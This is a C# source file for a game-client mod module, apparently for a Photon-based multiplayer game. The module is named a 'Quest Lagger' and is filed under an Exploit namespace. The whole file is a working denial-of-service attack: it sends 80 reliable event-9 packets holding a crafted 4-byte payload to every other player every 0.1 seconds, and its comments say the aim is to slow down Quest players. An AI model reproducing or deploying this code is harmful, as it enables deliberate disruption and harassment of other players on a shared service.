using Trinity.SDK.Photon;
using ExitGames.Client.Photon;
using MelonLoader;
using System;
using System.Collections;
using UnityEngine;
using Trinity.SDK;
namespace Trinity.Module.Exploit
{
    internal class megaqlagger : BaseModule
    {
        public megaqlagger() : base("Quest\nLagger v2", "Mega quest lagger, funny [4] go brrr", Main.Instance.EventQuickMenu, null, true) { }

        public override void OnEnable()
        {
            MelonCoroutines.Start(EventNine());
        }

        IEnumerator EventNine()
        {
            byte[] NullPayload = new byte[4]; // found out awhile ago 4 null bytes is a decent option for a lagger even with 0.1 wait seconds, makes quest kids go slow-mo
            byte[] LocalPlayer = BitConverter.GetBytes(int.Parse($"{PlayerWrapper.LocalPlayer.GetActorNumber()}00001")); 
            Buffer.BlockCopy(LocalPlayer, 0, NullPayload, 0, 4);
            while (toggled)
            {
                for (int i = 0; i < 80; i++)
                {                  
                    PhotonExtensions.OpRaiseEvent(9, NullPayload, new Photon.Realtime.RaiseEventOptions{ field_Public_ReceiverGroup_0 = Photon.Realtime.ReceiverGroup.Others, field_Public_EventCaching_0 = Photon.Realtime.EventCaching.DoNotCache}, SendOptions.SendReliable);
                }
                yield return new WaitForSecondsRealtime(0.1f);
            }
            yield break;
        }
    }
}
